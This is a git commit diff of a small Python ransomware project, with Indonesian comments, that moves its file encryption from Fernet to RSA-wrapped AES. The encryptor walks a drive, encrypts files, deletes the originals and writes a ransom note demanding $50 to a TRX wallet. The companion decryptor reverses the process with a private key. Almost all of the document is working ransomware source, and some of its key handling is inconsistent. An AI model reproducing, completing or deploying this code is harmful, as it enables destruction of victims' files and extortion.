1ea7a29c95105974114669fc03483058a34259f4
shinau21 <bandingandesa@gmail.com>
2023-03-24 15:34:28 +0700

    Change into rsa encryption

--- itsec-dec.py
+++ itsec-dec.py
@@ -1,46 +1,44 @@
-import tkinter as tk
 import os
-from cryptography.fernet import Fernet
+from time import sleep
+from cryptography.fernet import Fernet as xf
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
+from Crypto.Cipher import AES, PKCS1_OAEP
 
-def decrypt(filename, key):
-    f = Fernet(key)
-    with open(filename, "rb") as file:
-        # membaca enkripsi data
-        encrypted_data = file.read()
-    # memulihkan data
-    decrypted_data = f.decrypt(encrypted_data)
-    # menulis file ori
-    with open(filename, "wb") as file:
-        file.write(decrypted_data)
+lcx = xf.generate_key().decode()
 
-def payment(target=os.environ["USERPROFILE"]):
+def defense(target):
     for p, d, f in os.walk(target):
         for name in f:
             if name.endswith((".itsec")):
-                key1 = b'' + entry.get().encode('utf-8')
-                source = p + name
-                decrypt(os.path.join(p, name),key1)
-                newFile = os.path.splitext(name)[0]
-                os.rename(os.path.join(p, name), os.path.join(p,newFile))
                 try:
-                    os.remove(os.path.join(p, "_readme.txt"))
-                except FileNotFoundError:
-                    finish = "Sudah Terbayar"
-                    label1 = tk.Label(root, text=finish)
-                    label1.pack()
+                    #encrypt(os.path.join(p, name),RSA.importKey(pbk))
 
+                    with open(p + name, "rb") as mfile:
+                        newFile = os.path.splitext(name)[0]
+                        file_in = open(newFile, "wb")
 
+                        private_key = RSA.import_key(open("privateKey.pem").read())
 
-root = tk.Tk()
-root.geometry("800x800")
+                        enc_session_key, nonce, tag, ciphertext = [ mfile.read(x) for x in (private_key.size_in_bytes(), 16, 16, -1) ]
+                        mfile.close()
 
-label = tk.Label(root, text="ITSEC Decrypt Tool")
-label.pack()
+                        # Decrypt the session key with the private RSA key
+                        cipher_rsa = PKCS1_OAEP.new(private_key)
+                        session_key = cipher_rsa.decrypt(enc_session_key)
 
-entry = tk.Entry(root, width=500)
-entry.pack()
+                        # Decrypt the data with the AES session key
+                        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)
+                        data = cipher_aes.decrypt_and_verify(ciphertext, tag)
+                        file_in.write(data)
+                        file_in.close()
+                except:
+                    continue
+            try:
+                os.remove(os.path.join(p, "_readme.txt"))
+            except PermissionError:
+                problem = "Tidak bisa di isi file"
 
-submit_button = tk.Button(root, text="Decrypt", command=payment)
-submit_button.pack()
-
-root.mainloop()
+if __name__ == '__main__':
+    t0 = "H:"
+    defense(t0)
--- itsec-enc.py
+++ itsec-enc.py
@@ -1,20 +1,15 @@
 import os
 from time import sleep
-from cryptography.fernet import Fernet
+from cryptography.fernet import Fernet as xf
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
+from Crypto.Cipher import AES, PKCS1_OAEP
 
-def encrypt(filename, key):
-    f = Fernet(key)
-
-    with open(filename, "rb") as file:
-        #membaca file data
-        file_data = file.read()
-    # mengenkripsi data
-    encrypted_data = f.encrypt(file_data)
-
-    # menulis file yang terenkripsi
-    with open(filename, "wb") as file:
-        file.write(encrypted_data)
-
+kpx = RSA.generate(2048)
+skey = get_random_bytes(16)
+pbk = kpx.publickey().exportKey()
+pvk = kpx.exportKey()
+lcx = xf.generate_key().decode()
 
 def attack(target):
 
@@ -23,13 +18,29 @@ def attack(target):
     for p, d, f in os.walk(target):
         for name in f:
             if name.endswith((fl)):
-                key1 = b'2fTwz_LurjD2tLZ3BSrELZy5u7NHTXLXa9xG1CR70IA='
                 try:
-                    encrypt(os.path.join(p, name),key1)
-                    newFile = name +  ".itsec"
-                    os.rename(os.path.join(p, name), os.path.join(p,newFile))
+                    with open(p + name, "rb") as mfile:
+                        data = mfile.read()
+                        newFile = os.path.join(p, name) +  ".itsec"
+                        file_out = open(newFile, "wb")
+
+                        recipient_key = pbk
+                        session_key = get_random_bytes(16)
+
+                        # Encrypt the session key with the public RSA key
+                        cipher_rsa = PKCS1_OAEP.new(recipient_key)
+                        enc_session_key = cipher_rsa.encrypt(session_key)
+
+                        # Encrypt the data with the AES session key
+                        cipher_aes = AES.new(session_key, AES.MODE_EAX)
+                        ciphertext, tag = cipher_aes.encrypt_and_digest(data)
+                        [ file_out.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext) ]
+                        file_out.close()
+                        os.remove(os.path.join(p, name))
+                        #os.rename(os.path.join(p, name), os.path.join(p,newFile))
                 except:
                     continue
+
             # Tinggalkan pesan pada lines dibawah ini
             try:
                 lines = '''        !ATTENTION!
@@ -40,7 +51,7 @@ def attack(target):
                 If you want to back your file, you can buy my decrypt tools
                 Price of decrypt tools is $50
                 Send your payment into TRX Wallet : TE4vx8wFoBh8ZPapGWrYynLuKYqk3hN3G9
-                Your Personal Key is : ApgMpTktejvMpkpQ
+                Your Personal Key is : ''' + lcx + '''
                 Thank You For Your Attention (*v*)'''
                 with open(p + '\\' + '_readme.txt', 'w') as f:
                     f.writelines(lines)
@@ -48,5 +59,5 @@ def attack(target):
                 problem = "Tidak bisa di isi file"
 
 if __name__ == '__main__':
-    t0 = os.environ["USERPROFILE"]
+    t0 = "H:"
     attack(t0)
